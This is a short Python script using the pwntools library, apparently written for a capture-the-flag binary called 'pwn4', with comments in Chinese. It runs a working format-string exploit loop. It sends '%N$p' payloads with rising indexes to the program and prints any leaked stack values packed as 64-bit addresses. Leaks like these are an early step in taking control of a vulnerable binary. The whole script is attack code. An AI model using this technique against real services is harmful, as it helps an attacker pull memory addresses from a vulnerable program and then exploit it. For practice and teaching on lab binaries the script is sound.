#!/usr/bin/env python3
from pwn import *

context.log_level = 'error'

def leak(payload):
    sh = process('./pwn4')
    sh.sendline(payload.encode())  # 将字符串编码为字节
    data = sh.recvuntil(b'\n', drop=True)  # 使用字节字符串
    if data.startswith(b'0x'):  # 使用字节字符串比较
        # 将十六进制字符串转换为整数，然后打包为64位小端序
        leaked_addr = int(data, 16)
        print(p64(leaked_addr))
    sh.close()

i = 1
while True:
    payload = '%{}$p'.format(i)
    leak(payload)
    i += 1
